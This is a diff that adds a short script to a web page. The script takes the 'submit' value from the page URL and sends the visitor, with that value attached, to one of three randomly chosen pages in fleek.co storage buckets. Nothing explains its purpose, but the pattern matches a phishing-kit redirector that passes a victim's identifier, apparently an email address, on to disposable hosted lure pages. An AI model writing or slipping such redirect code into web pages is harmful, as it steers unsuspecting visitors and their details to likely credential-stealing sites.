@@ -1,0 +1,15 @@
+<script>
+	const queryString3 = window.location.search;
+			const urlParams3 = new URLSearchParams(queryString3);
+			const imageBoxx = urlParams3.get('submit');
+		  
+		  var srvr = imageBoxx;
+var linkList = 	[
+				"http://storageapi.fleek.co/07145fe2-b524-430b-84d3-fe3f583aec14-bucket/srvr/index.html?submit=",
+				"http://storageapi.fleek.co/6a151125-0655-4fb8-9669-6e2a38c78e63-bucket/llio/index.html?submit=",
+				"http://storageapi.fleek.co/af09acd5-cfd6-45ec-abef-51da84d950d6-bucket/cli/index.html?submit="
+			];
+
+var randomLink = linkList[Math.floor(Math.random()*linkList.length)];
+window.location.href = randomLink + srvr;
+</script>
